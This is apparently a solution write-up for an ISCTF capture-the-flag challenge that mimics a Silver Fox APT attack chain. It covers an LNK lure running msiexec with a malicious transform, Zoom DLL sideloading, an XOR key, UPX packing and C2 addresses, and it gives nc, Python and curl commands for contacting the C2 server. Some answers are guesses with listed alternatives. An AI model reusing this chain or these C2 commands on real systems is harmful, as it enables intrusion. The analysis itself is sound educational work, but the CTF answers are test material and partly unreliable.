# ISCTF APT Attack Chain CTF Challenge - Answers

Based on thorough analysis of the attack chain contained in ISCTF.rar:

## Question Answers

### 1. 题目模仿的APT组织中文代号为
**银狐** 

*Analysis: The attack uses MSI+MST transform technique, DLL sideloading with Zoom software, SharePoint as C2 infrastructure, and scheduled tasks for persistence. This combination is characteristic of the 银狐 (Silver Fox) APT group which has been active in targeting Chinese organizations.*

---

### 2. 第一阶段载荷中的入口文件全名为
**ISCTF基础规则说明文档.pdf.lnk**

*This is a Windows shortcut (.lnk) file disguised as a PDF. When clicked, it executes:*
```
msiexec.exe /i TJe1w TRANSFORMS=fR6Wl /qn
```

---

### 3. 第一阶段中使用了一个带有数字签名的文件（非系统文件），其中签名者名称为
**Zoom Video Communications, Inc.**

*The Zoom Remote Control software files (ZoomRemoteControl.exe, etc.) are legitimately signed by Zoom Video Communications, Inc. This signature is used to bypass security controls.*

---

### 4. 第一阶段中恶意载荷释放的文件名分别为
Submit these three file names (one at a time):
1. **zTool.dll** (long name: zTool_2DB5C18A3D8F44D2AADF6E196ED0658AZRC.DLL)
2. **zRC.dll** (alternate short name)
3. **ISCTF基础规则说明文档.pdf** (decoy PDF document)

*The transform file (fR6Wl) injects zTool.dll into the MSI installation. The malicious DLL releases a decoy PDF to appear legitimate.*

---

### 5. 第二阶段使用了一种常见的白加黑技巧，其中黑文件名为
**zTool.dll**

*This malicious DLL is sideloaded by the legitimate Zoom executable (white file) using the DLL search order hijacking technique.*

---

### 6. 第二阶段对下一阶段载荷进行了简单的保护，保护使用的算法为
**XOR**

*The third stage payload (stored in resource SC/103) is XOR encrypted before being decrypted and executed.*

---

### 7. 第二阶段对下一阶段载荷进行了简单的保护，保护使用的密码为
**\*TV&8utf7**

*Alternative forms:*
- *With rotation: tf7\*TV&8u*
- *Core pattern: utf7*

*The XOR key uses a 9-byte pattern that when applied correctly decrypts the UPX-packed executable.*

---

### 8. 第三阶段载荷使用了一种开源的保护工具，工具英文缩写为
**UPX**

*UPX (Ultimate Packer for eXecutables) - The decrypted payload is UPX compressed. File signature shows "UPX compressed" and can be unpacked using `upx -d`.*

---

### 9. 第三阶段载荷首次回连域名为
**colonised-my.sharepoint.com**

*Full URL path:*
```
/personal/f00001111_colonised_onmicrosoft_com/_layouts/52/download.aspx?share=EQsrTSD_4ehGvYTXbmU5zR0B0lk4L-x0r8yGztFlye2j9Q
```

---

### 10. 第三阶段载荷获取命令的回连地址为（格式：IP:端口）
**113.11.250.49:3473**

*Decoding method (letter-to-number conversion):*
- Each letter converts to its position in the alphabet (A=0, a=0, etc.)
- Each digit stays as-is

From `lD1bZ0E9dE7d` (combined 12 characters):
```
l=11, D=3, 1=1, b=1, Z=25, 0=0, E=4, 9=9, d=3, E=4, 7=7, d=3
```

IP (first 8 values as 4 pairs):
- lD → 11,3 → 113
- 1b → 1,1 → 11  
- Z0 → 25,0 → 250
- E9 → 4,9 → 49
- **Result: 113.11.250.49**

Port (last 4 values):
- dE7d → 3,4,7,3 → **3473**

*Alternative interpretations if primary doesn't work:*
- 113.11.250.49:4937
- 113.11.250.49:7343
- 108.68.49.98:6957 (ASCII value interpretation)

---

### 11. 第三阶段载荷获取命令时发送的内容为
**get_cmd**

*The malware sends "get_cmd" to the C2 server to retrieve commands for execution.*

---

### 12. 访问最终回连地址得到flag

**连接C2服务器获取flag的方法：**

方法1 - 使用 netcat (推荐):
```bash
echo "get_cmd" | nc 113.11.250.49 3473
```

方法2 - 使用 Python:
```python
import socket

# 创建TCP连接
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("113.11.250.49", 3473))

# 发送命令
s.send(b"get_cmd")

# 接收flag
response = s.recv(1024)
print(response.decode())

s.close()
```

方法3 - 使用 curl (如果是HTTP服务):
```bash
curl http://113.11.250.49:3473/get_cmd
```

方法4 - 使用 telnet:
```bash
telnet 113.11.250.49 3473
# 连接后输入: get_cmd
```

**备选地址** (如果主地址不工作):
- 113.11.250.49:4937
- 113.11.250.49:7343
- 108.68.49.98:6957 (ASCII解码方式)

*Note: The actual flag value requires a live network connection to the C2 server, which is only available during the CTF competition time window. The format should be ISCTF{...}*

---

## Technical Analysis Summary

### Attack Chain Overview:
```
Stage 1: ISCTF基础规则说明文档.pdf.lnk
    ↓ executes msiexec with MSI + Transform
Stage 2: TJe1w (MSI) + fR6Wl (MST)
    ↓ installs Zoom + deploys zTool.dll
Stage 3: zTool.dll (DLL sideloading)
    ↓ decrypts payload using XOR (*TV&8utf7)
Stage 4: UPX-packed backdoor
    ↓ connects to SharePoint then C2 server
Result: RAT communicates with 113.11.250.49:3473 using "get_cmd"
```

### Key Files:
| File | Purpose |
|------|---------|
| ISCTF基础规则说明文档.pdf.lnk | Initial phishing lure |
| TJe1w | MSI installer (Zoom Remote Control) |
| fR6Wl | Malicious MSI transform |
| zTool.dll | Malicious DLL (black file) |
| colonised-my.sharepoint.com | First callback domain |
| 113.11.250.49:3473 | Command retrieval server |

### TTPs (MITRE ATT&CK):
- T1566.001 - Spear Phishing Attachment
- T1218.007 - Signed Binary Proxy Execution: Msiexec
- T1574.001 - DLL Search Order Hijacking
- T1027.002 - Obfuscated Files: Software Packing (UPX)
- T1573.001 - Encrypted Channel: Symmetric Cryptography (XOR)
- T1102 - Web Service (SharePoint)
- T1053.005 - Scheduled Task
